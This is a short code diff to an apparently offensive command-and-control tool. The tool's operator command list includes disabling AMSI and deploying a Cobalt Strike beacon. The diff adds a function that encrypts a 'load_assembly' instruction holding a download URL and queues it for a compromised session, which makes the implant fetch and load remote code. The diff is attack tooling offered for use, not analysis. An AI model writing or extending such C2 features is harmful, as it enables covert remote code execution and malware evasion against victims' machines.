@@ -37,7 +37,7 @@ oct_commands = [
 ]
 
 oct_commands_interact = [
-    "load", "help", "exit", "back", "clear",
+    "load", "load_assembly", "help", "exit", "back", "clear",
     "download", "load", "report", "disable_amsi", "modules",
     "deploy_cobalt_beacon"
 ]
@@ -167,6 +167,15 @@ def load_module(session, module_name):
         print((colored("[+] Module should be loaded !", "green")))
     else:
         print((colored("[-] Module is not exist !")))
+
+
+
+def load_assembly(session, download_url):
+    cmd = "load_assembly {}".format(download_url)
+    base64_command = encrypt_command(aes_key, aes_iv, cmd)
+    commands[session] = base64_command
+    print((colored("[+] Shipped for delivery!", "green")))
+
 
 
 def load_beacon(session, beacon_path):
